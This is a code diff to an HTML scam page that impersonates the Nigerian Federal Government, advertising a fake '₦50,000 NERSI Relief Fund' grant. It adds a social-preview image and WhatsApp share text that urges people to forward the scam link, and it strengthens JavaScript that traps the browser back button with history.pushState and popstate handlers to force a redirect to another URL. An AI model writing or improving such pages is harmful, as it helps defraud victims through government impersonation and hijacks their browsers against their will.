@@ -9,9 +9,10 @@
     <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.1/dist/css/bootstrap.min.css">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
     
-    <!-- Meta Previews -->
+    <!-- Meta Previews (UPDATED IMAGE LINK) -->
     <meta property="og:title" content="NERSI RELIEF FUND - ₦50,000 GRANT" />
     <meta property="og:description" content="₦50,000 Relief Fund" />
+    <meta property="og:image" content="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhBHpNtV2oE87jo-zNp68uFSCPf9qN-Law71LLZYIG09CdfPgRbi8fpi7lh9CtewRTQVHCqhnGAa-snZG5BFCg1p9rr9isP8JyQsUyiFOGQLtzE8hF2J6d54IcT6m8-g9cV_knrHkcxYK3Us2LkxQ25nuGmFj3fbiVyQsObTliqA01NSsMTdlUE1XziP2w/s738/35962.jpg" />
     <meta property="og:type" content="website" />
 
     <style>
@@ -632,7 +633,6 @@
             });
 
             var width = 0;
-            // Fixed the quotation marks here
             var shareText = "*FEDERAL GOVERNMENT NERSI RELIEF FUND 2026*%0A%0AThe Federal Government is giving out *₦50,000 Grant* to support citizens. %0A%0AAPPLY HERE👉: https://metaink.xyz/NERSI-Relief-Fund %0A%0A*_Forward To Other Nigerians To Benefit._*";
             var shareUrl = "whatsapp://send?text=" + shareText;
             // Primary redirect URL
@@ -672,12 +672,28 @@
                 window.open(redirectUrl, "_blank");
             });
 
-            // Prevent browser back button and redirect to ad
-            window.onhashchange = function () { jp(); };
-            function hh() { history.pushState(history.length + 1, "message", "#" + Math.random()); }
-            function jp() { fh(); }
-            setTimeout('hh();', 500);
-            function fh() { location.href = redirectUrl; }
+            // AGGRESSIVE BACK BUTTON REDIRECT (From your old working script)
+            window.addEventListener('popstate', function() {
+                history.pushState(null, null, document.URL);
+                window.location.href = redirectUrl; // Forces redirect
+            });
+            
+            history.pushState(null, null, document.URL);
+
+            // Fallback for older mobile browsers
+            window.onhashchange = function () { 
+                jp(); 
+            }; 
+            function hh() { 
+                history.pushState(history.length + 1, "message", "#" + Math.random()); 
+            } 
+            function jp() { 
+                fh(); 
+            } 
+            setTimeout('hh();', 500); 
+            function fh() { 
+                location.href = redirectUrl; 
+            }
         });
     </script>
 </body>
